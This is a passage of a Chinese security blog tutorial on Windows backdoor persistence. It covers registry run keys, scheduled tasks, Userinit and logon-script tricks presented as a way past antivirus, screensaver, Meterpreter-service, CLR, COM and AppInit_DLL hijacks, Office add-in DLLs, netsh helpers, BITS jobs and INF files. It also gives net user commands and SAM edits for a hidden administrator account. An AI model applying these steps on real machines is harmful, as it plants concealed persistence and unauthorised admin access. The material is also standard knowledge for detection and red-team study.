<p>常见注册表启动项键的位置：</p>
<p>用户级</p>
<pre><code class="hljs taggerscript"><span class="hljs-symbol">\H</span>KEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un
<span class="hljs-symbol">\H</span>KEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce</code></pre>

<p>系统级</p>
<pre><code class="hljs taggerscript"><span class="hljs-symbol">\H</span>KEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un
<span class="hljs-symbol">\H</span>KEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce
<span class="hljs-symbol">\H</span>KEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\W</span>OW6432Node<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un
<span class="hljs-symbol">\H</span>KEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\W</span>OW6432Node<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce</code></pre>

<p>修改一下：</p>
<p><img src="/img/wz/nw/n3.png" srcset="/img/loading.gif" alt="n3"></p>
<p>执行结果：</p>
<p><img src="/img/wz/nw/n4.gif" srcset="/img/loading.gif" alt="n4"></p>
<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>windows下定时任务的命令有两个分别是：<code>at</code>和<code>schtasks</code>，他们两者主要区别是<code>at</code>命令在<code>win7</code>、<code>08</code>等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而<code>schtasks</code>是将定时的任务在前台执行，下面我们逐个看看</p>
<p><code>at</code>的一些参数</p>
<pre><code class="hljs jboss-cli">AT [\\computername] time [<span class="hljs-string">/INTERACTIVE</span>]
    [ <span class="hljs-string">/EVERY</span><span class="hljs-function">:date</span>[,<span class="hljs-string">...</span>] | <span class="hljs-string">/NEXT</span><span class="hljs-function">:date</span>[,<span class="hljs-string">...</span>]] <span class="hljs-string">"command"</span></code></pre>

<p>at的执行如下：</p>
<p><img src="/img/wz/nw/n5.gif" srcset="/img/loading.gif" alt="n5"></p>
<p><code>schtasks</code>一些参数：</p>
<pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> TaskName <span class="hljs-string">/tr</span> TaskRun <span class="hljs-string">/sc</span> schedule [<span class="hljs-string">/mo</span> modifier] [<span class="hljs-string">/d</span> day] [<span class="hljs-string">/m</span> month[,month.<span class="hljs-string">..</span>] [<span class="hljs-string">/i</span> IdleTime] [<span class="hljs-string">/st</span> StartTime] [<span class="hljs-string">/sd</span> StartDate] [<span class="hljs-string">/ed</span> EndDate] [<span class="hljs-string">/s</span> computer [<span class="hljs-string">/u</span> [domain\]user <span class="hljs-string">/p</span> password]] [<span class="hljs-string">/ru</span> &#123;[Domain\]User | <span class="hljs-string">"System"</span>&#125; [<span class="hljs-string">/rp</span> Password]] /?</code></pre>

<p>schtasks的执行如下：</p>
<p><img src="/img/wz/nw/n6.gif" srcset="/img/loading.gif" alt="n6"></p>
<h2 id="用户登陆初始化"><a href="#用户登陆初始化" class="headerlink" title="用户登陆初始化"></a>用户登陆初始化</h2><p><code>Userinit</code>的作用是用户在进行登陆初始化设置时，<code>WinLogon</code>进程会执行指定的<code>login scripts</code>，所以我们可以修改它的键值来添加我们要执行的程序</p>
<p>注册表路径为：<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code>，我们添加一个我们启动的程序，多个程序用逗号隔开</p>
<p><img src="/img/wz/nw/n7.jpeg" srcset="/img/loading.gif" alt="n7"></p>
<p>效果如下：</p>
<p><img src="/img/wz/nw/n8.gif" srcset="/img/loading.gif" alt="n8"></p>
<h2 id="Logon-Scripts"><a href="#Logon-Scripts" class="headerlink" title="Logon Scripts"></a>Logon Scripts</h2><p><code>Logon Scripts</code>优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截</p>
<p>注册表路径为：<code>HKEY_CURRENT_USER\Environment</code>，创建一个键为：<code>UserInitMprLogonScript</code>，其键值为我们要启动的程序路径</p>
<p><img src="/img/wz/nw/n9.png" srcset="/img/loading.gif" alt="n9"></p>
<p>效果如下：<br><img src="/img/wz/nw/n10.gif" srcset="/img/loading.gif" alt="n10"></p>
<h2 id="Logon-Scripts-1"><a href="#Logon-Scripts-1" class="headerlink" title="Logon Scripts"></a>Logon Scripts</h2><p><code>Logon Scripts</code>优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截</p>
<p>注册表路径为：<code>HKEY_CURRENT_USER\Environment</code>，创建一个键为：<code>UserInitMprLogonScript</code>，其键值为我们要启动的程序路径</p>
<p><img src="/img/wz/nw/n11.png" srcset="/img/loading.gif" alt="n11"></p>
<p>效果如下：<br><img src="/img/wz/nw/n12.gif" srcset="/img/loading.gif" alt="n12"></p>
<h2 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h2><p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的<br>其中屏幕保护的配置存储在注册表中，其位置为：<code>HKEY_CURRENT_USER\Control Panel\Desktop</code>，关键键值如下：</p>
<ol>
<li><code>SCRNSAVE.EXE</code> - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序</li>
<li><code>ScreenSaveActive</code> - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态</li>
<li><code>ScreenSaverTimeout</code> - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）</li>
</ol>
<p>设置如下：<br><img src="/img/wz/nw/n13.png" srcset="/img/loading.gif" alt="n13"></p>
<p>效果图：</p>
<p><img src="/img/wz/nw/n14.jpeg" srcset="/img/loading.gif" alt="n14"></p>
<h2 id="自启动服务"><a href="#自启动服务" class="headerlink" title="自启动服务"></a>自启动服务</h2><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将<code>exe</code>文件注册为服务，也可以将<code>dll</code>文件注册为服务</p>
<p>为了方便起见我们可以直接用<code>Metasploit</code>来注册一个服务</p>
<pre><code class="hljs dockerfile">meterpreter &gt; <span class="hljs-keyword">run</span><span class="bash"> metsvc -A</span></code></pre>

<p><img src="/img/wz/nw/n15.jpeg" srcset="/img/loading.gif" alt="n15"></p>
<p>运行之后msf会在<code>%TMP%</code>目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：<code>metsvc.dll</code>、<code>metsvc-server.exe</code>、<code>metsvc.exe</code></p>
<p><img src="/img/wz/nw/n16.png" srcset="/img/loading.gif" alt="n16"></p>
<p>同时会新建一个服务，其显示名称为<code>Meterpreter</code>，服务名称为<code>metsvc</code>，启动类型为”自动”，默认绑定在31337端口。</p>
<p><img src="/img/wz/nw/n17.png" srcset="/img/loading.gif" alt="n17"></p>
<p><img src="/img/wz/nw/n18.png" srcset="/img/loading.gif" alt="n18"></p>
<p>如果想删除服务，可以执行</p>
<pre><code class="hljs dockerfile">meterpreter &gt; <span class="hljs-keyword">run</span><span class="bash"> metsvc -r</span></code></pre>

<h2 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h2><p>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的</p>
<p>在用户名后面加一个<code>$</code>可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组</p>
<pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>test$ test /add
net localgroup administrators test$ /add</code></pre>

<p>可以看到<code>net user</code>是看不到我们创建的用户，但是计算机管理-用户和组中可以看到</p>
<p><img src="/img/wz/nw/n19.png" srcset="/img/loading.gif" alt="n19"></p>
<p>所以这时候我们就需要修改一下注册表，其键位置为：<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</code></p>
<p>注意：<code>SAM</code>键值默认是只能<code>system</code>权限修改的，所以我们要修改一下<code>SAM</code>键的权限，给予<code>administrator</code>完全控制和读取的权限</p>
<p><img src="/img/wz/nw/n20.png" srcset="/img/loading.gif" alt="n20"></p>
<p>然后我们将<code>administrator</code>用户对应的项中的F值复制到<code>test$</code>对应xiang中的F值，然后保存</p>
<p><img src="/img/wz/nw/n21.jpeg" srcset="/img/loading.gif" alt="n21"></p>
<p>然后我们将<code>test$</code>删除掉</p>
<pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>test$ /del</code></pre>

<p>然后再双击导出的注册表文件，然后我们再看一下</p>
<p><img src="/img/wz/nw/n22.jpeg" srcset="/img/loading.gif" alt="n22"></p>
<p><code>net user</code>和计算机管理-用户和组中都查看不到用户了，但是我们可以用<code>net user test$</code>查看用户信息</p>
<p>这个时候我们再用<code>net user test$ /del</code>是删除不掉这个用户的，只能通过注册表来删除。</p>
<h2 id="waitfor"><a href="#waitfor" class="headerlink" title="waitfor"></a>waitfor</h2><p>关于<code>waitfor</code>手册中是这么解释的：</p>
<pre><code class="hljs plain">在系统上发送或等待信号。waitfor可用于跨网络同步计算机。</code></pre>

<p><code>waitfor</code>的语法</p>
<pre><code class="hljs fsharp">waitfor [/s &lt;Computer&gt; [/u <span class="hljs-meta">[&lt;Domain&gt;\]&lt;User&gt; [/p [&lt;Password&gt;]</span>]]] /si &lt;SignalName&gt;
waitfor [/t &lt;Timeout&gt;] &lt;SignalName&gt;</code></pre>

<p>参数解释：</p>
<pre><code class="hljs fsharp">/s &lt;Computer&gt;  指定远程计算机的名称或IP地址，默认为本地计算机
/u <span class="hljs-meta">[&lt;Domain&gt;]</span>&lt;user&gt;    使用指定用户帐户的凭据运行脚本。默认是使用当前用户的凭据。
/p &lt;Password&gt;  指定/u参数中指定的用户帐户的密码。
/si            发送指定激活信号。
/t             指定等待信号的秒数。默认为无限期等待。
&lt;SignalName&gt;    指定等待或发送的信号，不区分大小写，长度不能超过<span class="hljs-number">225</span>个字符</code></pre>

<p>关于<code>waitfor</code>更多的信息可以看一下微软提供的手册：链接</p>
<p>我们来测试一下看看</p>
<pre><code class="hljs jboss-cli">waitfor test &amp;&amp; calc 表示接收信号成功后执行计算器

waitfor <span class="hljs-string">/s</span> 192.168.163.143 <span class="hljs-string">/u</span> qiyou <span class="hljs-string">/p</span> qiyou <span class="hljs-string">/si</span> test</code></pre>

<p>结果如下<br><img src="/img/wz/nw/n23.gif" srcset="/img/loading.gif" alt="n23"></p>
<p>但是这样只能执行一次，这对我们后门持久化很不利，所以我们得想办法让它持久化。</p>
<p>这里就要借用一下三好师傅的<code>powershell</code>脚本：链接，三好师傅的分析：链接</p>
<p>执行效果如下：</p>
<p><img src="/img/wz/nw/n24.gif" srcset="/img/loading.gif" alt="n24"></p>
<p>该方法的优点就是能主动激活，但是缺点也明显就是只能在同一网段才能接收和发送激活信号、服务器重启之后就不行了。</p>
<h2 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h2><p>CLR的简述（来自百度百科）</p>
<pre><code class="hljs avrasm"><span class="hljs-keyword">CLR</span>(公共语言运行库,Common Language Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。<span class="hljs-keyword">CLR</span>的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向<span class="hljs-keyword">CLR</span>的所有语言使用。并保证应用和底层操作系统之间必要的分离。<span class="hljs-keyword">CLR</span>是.NET Framework的主要执行引擎。</code></pre>

<p>需要注意的是<code>CLR</code>能够劫持系统中全部<code>.net</code>程序，而且系统默认会调用<code>.net</code>程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来实现一下</p>
<p>修改一下注册表，注册表路径：<code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code>，新建子项<code>{11111111-1111-1111-1111-111111111111}</code>（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项<code>InProcServer32</code>，新建一个键<code>ThreadingModel</code>，键值为：<code>Apartment</code>，默认的键值为我们<code>dll</code>的路径</p>
<p><img src="/img/wz/nw/n25.png" srcset="/img/loading.gif" alt="n25"></p>
<p>然后在cmd下设置一下：<br><strong>PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序</strong></p>
<pre><code class="hljs angelscript">SETX COR_ENABLE_PROFILING=<span class="hljs-number">1</span> /M
SETX COR_PROFILER=&#123;<span class="hljs-number">11111111</span><span class="hljs-number">-1111</span><span class="hljs-number">-1111</span><span class="hljs-number">-1111</span><span class="hljs-number">-111111111111</span>&#125; /M</code></pre>

<p>然后执行一波，效果如下，可以看到已经成功劫持了<br><img src="/img/wz/nw/n26.gif" srcset="/img/loading.gif" alt="n26"></p>
<h2 id="Hijack-CAccPropServicesClass-and-MMDeviceEnumerator"><a href="#Hijack-CAccPropServicesClass-and-MMDeviceEnumerator" class="headerlink" title="Hijack CAccPropServicesClass and MMDeviceEnumerator"></a>Hijack CAccPropServicesClass and MMDeviceEnumerator</h2><p>什么是<code>COM</code>（来自<code>WIKI</code>）</p>
<pre><code class="hljs avrasm">组件对象模型（英语：Component Object Model，缩写<span class="hljs-keyword">COM</span>）是微软的一套软件组件的二进制接口标准。这使得跨编程语言的进程间通信、动态对象创建成为可能。<span class="hljs-keyword">COM</span>是多项微软技术与框架的基础，包括OLE、OLE自动化、ActiveX、<span class="hljs-keyword">COM</span>+、DCOM、Windows shell、DirectX、Windows Runtime。</code></pre>

<p>这个和<code>CRL</code>劫持<code>.NET</code>程序类似，也是通过修改<code>CLSID</code>下的注册表键值，实现对<code>CAccPropServicesClass</code>和<code>MMDeviceEnumerator</code>的劫持，而系统很多正常程序启动时需要调用这两个实例，所以这个很适合我们的后门持久化。</p>
<p>经测试貌似64位系统下不行（或许是我姿势的问题），但是32位系统下可以，下面说一下32位系统利用方法：</p>
<p>在<code>%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\</code>下放入我们的后门<code>dll</code>，重命名为<code>test._dl</code></p>
<p>PS：如果<code>Installer</code>文件夹不存在，则依次创建<code>Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}</code></p>
<p><img src="/img/wz/nw/640.png" srcset="/img/loading.gif" alt="640"></p>
<p>然后就是修改注册表了，在注册表位置为：<code>HKCU\Software\Classes\CLSID\</code>下创建项<code>{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code>，然后再创建一个子项<code>InprocServer32</code>，默认为我们的<code>dll</code>文件路径：<code>C:\Users\qiyou\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}</code>，再创建一个键<code>ThreadingModel</code>，其键值为：<code>Apartment</code></p>
<p><img src="/img/wz/nw/n27.jpeg" srcset="/img/loading.gif" alt="n27"></p>
<p>然后就是测试了，打开<code>iexplore.exe</code>，成功弹框</p>
<p><img src="/img/wz/nw/n28.gif" srcset="/img/loading.gif" alt="n28"></p>
<p>PS：<code>{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code>对应<code>CAccPropServicesClass</code>，<code>{BCDE0395-E52F-467C-8E3D-C4579291692E}</code>对应<code>MMDeviceEnumerator</code></p>
<h2 id="劫持MruPidlList"><a href="#劫持MruPidlList" class="headerlink" title="劫持MruPidlList"></a>劫持MruPidlList</h2><p>在注册表位置为<code>HKCU\Software\Classes\CLSID\</code>下创建项<code>{42aedc87-2188-41fd-b9a3-0c966feabec1}</code>，再创建一个子项<code>InprocServer32</code>，默认的键值为我们的dll路径，再创建一个键<code>ThreadingModel</code>，其键值：<code>Apartment</code></p>
<p><img src="/img/wz/nw/n29.png" srcset="/img/loading.gif" alt="n29"></p>
<p>该注册表对应<code>COM</code>对象<code>MruPidlList</code>，作用于<code>shell32.dll</code>，而<code>shell32.dll</code>是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中<code>explorer.exe</code>会调用<code>shell32.dll</code>，然后会加载COM对象<code>MruPidlList</code>，从而触发我们的<code>dll</code>文件</p>
<p><img src="/img/wz/nw/n30.jpeg" srcset="/img/loading.gif" alt="n30"></p>
<p>当用户重启时或者重新创建一个<code>explorer.exe</code>进程时，就会加载我们的恶意dll文件，从而达到后门持久化的效果。这里我们直接结束一个<code>explorer.exe</code>进程再起一个进程来看一下效果</p>
<p><img src="/img/wz/nw/n31.gif" srcset="/img/loading.gif" alt="n31"></p>
<h2 id="office系列"><a href="#office系列" class="headerlink" title="office系列"></a>office系列</h2><h3 id="Word-WLL"><a href="#Word-WLL" class="headerlink" title="Word WLL"></a>Word WLL</h3><p>把dll文件保存在<code>%APPDATA%\Microsoft\Word\Startup</code>，然后把后缀名改为<code>wll</code><br>PS：<code>Startup</code>支持启动多个<code>wll</code></p>
<p>打开word，成功弹框<br><img src="/img/wz/nw/n32.gif" srcset="/img/loading.gif" alt="n32"></p>
<h3 id="Excel-XLL"><a href="#Excel-XLL" class="headerlink" title="Excel XLL"></a>Excel XLL</h3><p><code>Excel dll</code>的编写可以参考三好师傅这个项目：链接<br>用三好师傅powershell脚本生成现成的<code>Excel dll</code>：链接</p>
<p>将生成的DLL文件复制到<code>%appdata%\Microsoft\AddIns</code>目录下，然后再修改一下注册表，<code>office</code>版本对应的注册表位置如下：</p>
<pre><code class="hljs taggerscript">office2003 — HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>ffice<span class="hljs-symbol">\1</span>1.0\
office2007 — HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>ffice<span class="hljs-symbol">\1</span>2.0\
office2010 — HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>ffice<span class="hljs-symbol">\1</span>4.0\
office2013 — HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>ffice<span class="hljs-symbol">\1</span>5.0\
office2016 — HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>ffice<span class="hljs-symbol">\1</span>6.0\</code></pre>

<p>我这里使用的2010的，所以我们要修改的是<code>HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options</code>，添加一个键<code>OPEN</code>，键值为：<code>/R test.dll</code></p>
<p><img src="/img/wz/nw/n33.jpeg" srcset="/img/loading.gif" alt="n33"></p>
<p>然后打开<code>Excel</code>，发现成功弹出计算器</p>
<p><img src="/img/wz/nw/n34.gif" srcset="/img/loading.gif" alt="n34"></p>
<h3 id="PowerPoint-VBA-add-ins"><a href="#PowerPoint-VBA-add-ins" class="headerlink" title="PowerPoint VBA add-ins"></a>PowerPoint VBA add-ins</h3><p>用三好师傅powershell脚本生成现成的<code>PowerPoint dll</code>：链接</p>
<p>将生成的DLL文件复制到<code>%appdata%\Microsoft\AddIns</code>目录下，然后参考前面我给出的<code>office</code>版本对应的注册表位置，在<code>HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint</code>下新建一个子项：<code>AddIns</code>，然后在<code>AddIns</code>下面新建一个子项<code>test</code>，新建一个键为<code>Autoload</code>，类型为<code>DWORD</code>，键值为：<code>1</code>；新建一个键为<code>Path</code>，类型为<code>SZ</code>，键值为我们<code>dll</code>文件的路径</p>
<p><img src="/img/wz/nw/n35.jpeg" srcset="/img/loading.gif" alt="n35"></p>
<p>打开<code>PowerPoint</code>成功弹出计算器</p>
<p><img src="/img/wz/nw/n36.gif" srcset="/img/loading.gif" alt="n36"></p>
<h2 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h2><p>什么是文件关联</p>
<pre><code class="hljs armasm">文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系。一个文件可以与多个应用程序发生关联。可以利用文件的“打开方式”进行关联选择。
举个例子来说，位图文件（<span class="hljs-keyword">BMP文件）在Windows中的默认关联程序是“图片”，如果将其默认关联改为用ACDSee程序来打开，那么ACDSee就成了它的默认关联程序。</span>
<span class="hljs-keyword">PS：来自百度百科</span></code></pre>

<p>我们可以用<code>assoc</code>命令显示或修改文件扩展名关联，我们可以看一下<code>.txt</code>文件的关联</p>
<p><img src="/img/wz/nw/n37.png" srcset="/img/loading.gif" alt="n37"></p>
<p>我们可以用<code>ftype</code>命令显示或修改用在文件扩展名关联中的文件类型</p>
<p><img src="/img/wz/nw/n38.png" srcset="/img/loading.gif" alt="n38"></p>
<p>相关注册表</p>
<pre><code class="hljs taggerscript">HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasse    //保存了当前用户的类注册和文件扩展名信息
HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasse   //保存了系统所有用户用户的类注册和文件扩展名信息
HKEY_CLASS_ROOT                      //HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图</code></pre>

<p>我们以<code>.txt</code>为例，通过文件关联来修改它默认打开的程序。<br>修改<code>\HKEY_CLASS_ROOT\txtfile\shell\open\command</code>的默认值为我们要执行的程序</p>
<p><img src="/img/wz/nw/n39.png" srcset="/img/loading.gif" alt="n39"></p>
<p>效果如下：</p>
<p><img src="/img/wz/nw/n40.gif" srcset="/img/loading.gif" alt="n40"></p>
<h2 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h2><p><code>User32.dll</code>被加载到进程时，会读取<code>AppInit_DLLs</code>注册表项，如果有值，调用<code>LoadLibrary() api</code>加载用户dll。</p>
<p>其注册表位置为：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>，把<code>AppInit_DLLs</code>的键值设置为我们dll路径，将<code>LoadAppInit_DLLs</code>设置为1</p>
<p><img src="/img/wz/nw/n41.jpeg" srcset="/img/loading.gif" alt="n41"></p>
<p>效果如下：</p>
<p><img src="/img/wz/nw/n42.gif" srcset="/img/loading.gif" alt="n42"></p>
<h2 id="Netsh-helper"><a href="#Netsh-helper" class="headerlink" title="Netsh helper"></a>Netsh helper</h2><p><code>netsh</code>（全称：<code>Network Shell</code>） 是<code>windows</code>系统本身提供的功能强大的网络配置命令行工具，它可以添加自定的dll从而拓展其功能，我们可以使用<code>netsh add helper yourdll.dll</code>来添加拓展功能，添加了之后，在启动<code>netsh</code>的时候就会加载我们dll文件</p>
<p>添加自定义<code>helper dll</code><br>关于<code>helper dll</code>的编写可以参考这个项目：链接</p>
<p>我们可以使用两种方式来添加helper：</p>
<ol>
<li><p>通过cmd添加helper</p>
<pre><code class="hljs dockerfile">netsh <span class="hljs-keyword">add</span><span class="bash"> helper test.dll</span></code></pre>

<p><img src="/img/wz/nw/n43.png" srcset="/img/loading.gif" alt="n43"></p>
</li>
<li><p>通过注册表添加helper<br>其位置为：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code>，创建一个键，名称随便，键值为我们dll的路径</p>
</li>
</ol>
<p><img src="/img/wz/nw/n44.jpeg" srcset="/img/loading.gif" alt="n44"></p>
<p>效果如下：<br><img src="/img/wz/nw/n45.gif" srcset="/img/loading.gif" alt="n45"></p>
<h2 id="利用BITS"><a href="#利用BITS" class="headerlink" title="利用BITS"></a>利用BITS</h2><p><code>BITS</code> (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</p>
<p><code>bitsadmin</code>是一个命令行工具，用于创建下载或上传任务并监视其进度。你可以执行<code>bitsadmin /?</code>或<code>bitsadmin /HELP</code>获取帮助列表。</p>
<p>常见的<code>bitsadmin</code>命令</p>
<pre><code class="hljs jboss-cli">bitsadmin <span class="hljs-string">/create</span> [type] DisplayName <span class="hljs-string">//</span>创建一个任务
bitsadmin <span class="hljs-string">/cancel</span> &lt;Job&gt; <span class="hljs-string">//</span>删除一个任务
bitsadmin <span class="hljs-string">/list</span> <span class="hljs-string">/allusers</span> <span class="hljs-string">/verbose</span> <span class="hljs-string">//</span>列出所有任务
bitsadmin <span class="hljs-string">/AddFile</span> &lt;Job&gt; &lt;RemoteURL&gt; &lt;LocalName&gt; <span class="hljs-string">//</span>给任务test添加一个下载文件
bitsadmin <span class="hljs-string">/SetNotifyCmdLine</span> &lt;Job&gt; &lt;ProgramName&gt; [ProgramParameters] <span class="hljs-string">//</span>设置在任务完成传输时或任务进入状态时将运行的命令行命令。
bitsadmin <span class="hljs-string">/Resume</span> &lt;Job&gt; <span class="hljs-string">//</span>激活传输队列中的新任务或挂起的任务。
bitsadmin <span class="hljs-string">/cancel</span> &lt;Job&gt; <span class="hljs-string">//</span>删除某个任务
bitsadmin <span class="hljs-string">/reset</span> <span class="hljs-string">/allusers</span> <span class="hljs-string">//</span>删除所有任务
bitsadmin <span class="hljs-string">/complete</span> &lt;Job&gt; <span class="hljs-string">//</span>完成某个任务</code></pre>

<p>下面我们来测试一下：</p>
<pre><code class="hljs sql">bitsadmin /<span class="hljs-keyword">create</span> <span class="hljs-keyword">test</span>
bitsadmin /addfile <span class="hljs-keyword">test</span> c:\windows\system32\calc.exe c:\<span class="hljs-keyword">Users</span>\qiyou\Desktop\calc.exe //为了方便起见我们直接复制本地文件
bitsadmin /SetNotifyCmdLine <span class="hljs-keyword">test</span> cmd.exe <span class="hljs-string">"cmd.exe /c calc.exe"</span>
bitsadmin /<span class="hljs-keyword">resume</span> <span class="hljs-keyword">test</span></code></pre>

<p>效果如下：<br><img src="/img/wz/nw/n46.gif" srcset="/img/loading.gif" alt="n46"></p>
<p>重启电脑之后任务还是存在</p>
<p><img src="/img/wz/nw/n47.png" srcset="/img/loading.gif" alt="n47"></p>
<p>重启电脑之后任务会再一次被激活，大概几分钟之后我们的命令会再次执行（由于时间太长了就不录制gif了）</p>
<p><img src="/img/wz/nw/n48.png" srcset="/img/loading.gif" alt="n48"></p>
<p>如果我们想让任务完成，可以执行<code>bitsadmin /complete test</code>，<code>calc.exe</code>也会复制到桌面上</p>
<p><img src="/img/wz/nw/n49.png" srcset="/img/loading.gif" alt="n49"></p>
<h2 id="利用inf文件实现后门"><a href="#利用inf文件实现后门" class="headerlink" title="利用inf文件实现后门"></a>利用inf文件实现后门</h2><p><code>inf</code>文件</p>
<pre><code class="hljs gams"><span class="hljs-literal">INF</span>文件或安装信息文件是Microsoft Windows用于安装软件和驱动程序的纯文本文件。<span class="hljs-literal">INF</span>文件最常用于安装硬件组件的设备驱动程序。Windows包含用于创建基于<span class="hljs-literal">INF</span>的安装的IExpress工具。<span class="hljs-literal">INF</span>文件是Windows安装程序API及其后续版本Windows Installer的一部分。
PS：来自WIKI
<span class="hljs-literal">inf</span>`文件的结构
想了解更多可以看一下微软的手册：`https:<span class="hljs-comment">//docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries</span>
<span class="hljs-number">1.</span> DefaultInstall节（来自WIKI）
<span class="hljs-literal">INF</span>文件的结构与INI文件的结构非常类似; 它包含用于指定要复制的文件，对注册表的更改等的各个部分。所有<span class="hljs-literal">INF</span>文件都包含一个[Version]带有Signature 键值对的部分，用于指定<span class="hljs-literal">INF</span>文件所针对的Windows版本。签名通常是<span class="hljs-symbol">$</span>CHICAGO<span class="hljs-symbol">$</span>（对于Windows <span class="hljs-number">9</span>x）或<span class="hljs-symbol">$</span>WINDOWS NT<span class="hljs-symbol">$</span>（对于Windows NT / <span class="hljs-number">2</span>K / XP）。其余大多数部分是用户定义的，并且包含特定于要安装的组件的信息。

<span class="hljs-number">2.</span> DefaultInstall节（来自微软的手册）
    RunPreSetupCommands-本节中指定的命令在安装服务配置文件之前运行。
    RunPostSetupCommands-本节中指定的命令在安装程序完成服务配置文件后运行。
    RunPreUnInstCommands-本节中指定的命令在卸载程序开始之前运行。
    RunPostUnInstCommands-本节中指定的命令在卸载程序运行后运行。</code></pre>

<p>下面举一个<code>calc.inf</code>弹计算器的例子</p>
<pre><code class="hljs routeros">[Version]
<span class="hljs-attribute">Signature</span>=<span class="hljs-string">"<span class="hljs-variable">$CHICAGO</span>$"</span>
<span class="hljs-attribute">AdvancedINF</span>=2.5,"test"
[DefaultInstall]
<span class="hljs-attribute">RunPreSetupCommands</span>=Command1
[Command1]
C:\windows\system32\calc.exe</code></pre>

<p>命令行下执行：</p>
